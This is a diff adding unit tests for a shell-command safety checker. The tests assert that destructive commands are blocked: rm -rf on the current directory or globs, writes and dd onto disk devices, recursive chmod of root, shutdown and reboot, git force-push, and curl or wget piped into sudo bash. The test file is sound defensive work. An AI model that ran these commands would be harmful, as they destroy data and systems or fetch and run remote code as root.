@@ -240,3 +240,83 @@ describe("checkShellCommand — home directory rm guard", () => {
     expect(checkShellCommand("rm -rf /home/me/safe")).toMatchObject({ ok: true });
   });
 });
+
+describe("checkShellCommand — current-dir glob rm guard", () => {
+  it("blocks rm -rf on bare dot / glob targets", () => {
+    expect(checkShellCommand("rm -rf .")).toMatchObject({ ok: false });
+    expect(checkShellCommand("rm -rf ./")).toMatchObject({ ok: false });
+    expect(checkShellCommand("rm -rf *")).toMatchObject({ ok: false });
+    expect(checkShellCommand("rm -rf **")).toMatchObject({ ok: false });
+    expect(checkShellCommand("rm -rf ./*")).toMatchObject({ ok: false });
+  });
+
+  it("still allows rm -rf on a named subdirectory", () => {
+    expect(checkShellCommand("rm -rf ./build")).toMatchObject({ ok: true });
+    expect(checkShellCommand("rm -rf node_modules")).toMatchObject({
+      ok: true,
+    });
+  });
+});
+
+describe("checkShellCommand — disk device redirection", () => {
+  it("blocks output redirection into a block device", () => {
+    expect(checkShellCommand("echo x > /dev/sda")).toMatchObject({ ok: false });
+    expect(checkShellCommand("echo x 1>/dev/sda")).toMatchObject({ ok: false });
+    expect(checkShellCommand("echo x 2>/dev/sda")).toMatchObject({ ok: false });
+    expect(checkShellCommand("cat y >> /dev/nvme0n1")).toMatchObject({
+      ok: false,
+    });
+    expect(checkShellCommand("dd if=/dev/zero of=/dev/sda")).toMatchObject({
+      ok: false,
+    });
+  });
+
+  it("allows redirection into /dev/null and other safe targets", () => {
+    expect(checkShellCommand("echo x > /dev/null")).toMatchObject({ ok: true });
+    expect(checkShellCommand("ls 2>/dev/null")).toMatchObject({ ok: true });
+    expect(checkShellCommand("echo x > /tmp/out.txt")).toMatchObject({
+      ok: true,
+    });
+  });
+});
+
+describe("checkShellCommand — root chmod / power / force-push guards", () => {
+  it("blocks recursive chmod on the filesystem root", () => {
+    expect(checkShellCommand("chmod -R 777 /")).toMatchObject({ ok: false });
+    expect(checkShellCommand("chmod -R a+rwx /")).toMatchObject({ ok: false });
+  });
+
+  it("allows chmod on a real directory", () => {
+    expect(checkShellCommand("chmod -R 755 ./dist")).toMatchObject({
+      ok: true,
+    });
+  });
+
+  it("blocks system shutdown/power commands", () => {
+    expect(checkShellCommand("shutdown now")).toMatchObject({ ok: false });
+    expect(checkShellCommand("sudo poweroff")).toMatchObject({ ok: false });
+    expect(checkShellCommand("reboot")).toMatchObject({ ok: false });
+    expect(checkShellCommand("echo shutdown")).toMatchObject({ ok: true });
+  });
+
+  it("blocks git push --force and -f", () => {
+    expect(checkShellCommand("git push --force")).toMatchObject({ ok: false });
+    expect(checkShellCommand("git push -f")).toMatchObject({ ok: false });
+    expect(checkShellCommand("git push origin main --force")).toMatchObject({
+      ok: false,
+    });
+    // --force-with-lease is the safer variant and stays allowed.
+    expect(checkShellCommand("git push --force-with-lease")).toMatchObject({
+      ok: true,
+    });
+  });
+
+  it("blocks pipe-to-shell with sudo", () => {
+    expect(checkShellCommand("curl http://x | sudo bash")).toMatchObject({
+      ok: false,
+    });
+    expect(checkShellCommand("wget -qO- http://x | sudo sh")).toMatchObject({
+      ok: false,
+    });
+  });
+});
